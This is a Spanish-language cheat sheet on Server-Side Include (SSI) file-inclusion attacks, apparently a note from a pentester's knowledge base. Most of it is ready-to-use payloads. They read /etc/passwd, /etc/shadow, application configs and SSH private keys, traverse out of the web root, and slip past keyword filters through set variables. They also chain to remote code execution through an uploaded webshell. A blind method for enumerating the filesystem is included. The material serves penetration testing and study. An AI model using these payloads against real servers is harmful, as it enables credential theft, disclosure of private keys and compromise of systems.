---
aliases:
  - SSI include virtual
  - SSI file include
  - SSI LFI
tags:
  - type/cheatsheet
  - vuln/ssi
  - vuln/lfi
  - technique/collection
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[Server-Side Includes (SSI) Injection]]"
---
# SSI - Inclusión de Archivos

***

## Cheatsheet

| **Objetivo** | **Payload** | **Notas** |
|:---:|:---:|---|
| **Include archivo relativo** | `<!--#include virtual="/admin/config.php" -->` | Path relativo a web root. Fallback si `#exec` deshabilitado. |
| **Include archivo absoluto** | `<!--#include file="/etc/passwd" -->` | `file=` acepta path absoluto del filesystem (depende de config). |
| **CGI include** | `<!--#include virtual="/cgi-bin/test.cgi" -->` | Ejecuta CGI y embebe output. |
| **Include con traversal** | `<!--#include virtual="../../../../etc/passwd" -->` | Bypass de restricciones webroot. |
| **Include PHP (ejecuta)** | `<!--#include virtual="/uploads/shell.php" -->` | Si SSI + PHP coexisten → RCE vía webshell previamente subido. |
| **Print var entorno** | `<!--#echo var="DOCUMENT_ROOT" -->` | Filesystem fingerprint. Ver [[SSI - Fingerprinting]]. |
| **Set + include combo** | `<!--#set var="path" value="/etc/passwd"--><!--#include file="$path" -->` | Bypass filters que matchean `include.*passwd`. |
^ssi-include

___

## Overview

Directivas `#include virtual` / `#include file` permiten embeber contenido de **archivos del server** en la respuesta HTML. Cuando `#exec` está deshabilitado (`+IncludesNOEXEC`), este es el fallback principal para extraer datos o chain a RCE via webshell.

### Diferencias `virtual` vs `file`

| Directiva | Path tipo | Scope |
|---|---|---|
| `#include virtual` | URL-relative (resolución como request HTTP) | Puede llamar CGI, otros .shtml, triggerea handlers |
| `#include file` | Filesystem relative | NO sigue symlinks fuera del dir actual por default. Sin handlers — raw file content. |

### Usos operativos

**1. Source code disclosure:**
```html
<!--#include virtual="/index.php.bak" -->
<!--#include file="../../config/db.yml" -->
```

**2. LFI clásico (credentials/config):**
```html
<!--#include file="/etc/passwd" -->
<!--#include file="/etc/shadow" -->         <!-- requiere privs -->
<!--#include file="/var/www/html/config.php" -->
<!--#include file="/home/user/.ssh/id_rsa" -->
```

**3. Chain SSI → RCE vía file upload previo:**
```html
<!-- Si podés subir .txt con PHP tags + hay PHP handler: -->
<!--#include virtual="/uploads/shell.txt" -->
```

**4. Environment fingerprint:**
```html
<!--#include virtual="/cgi-bin/printenv" -->
```

### Blind: timing vs existence

Diferenciar "archivo existe vs no":
- Existe → respuesta con contenido embebido (variable size).
- No existe → `[an error occurred while processing this directive]` (string fijo).

Enum filesystem via diff de respuestas.

### Limitaciones

- `#include virtual` respeta ACLs del server (no saltea auth de otro vhost).
- `#include file` puede estar chrooted via `Options +IncludesNOEXEC -Includes` parciales.
- Apache puede bloquear paths absolutos con `AllowOverride None`.

***
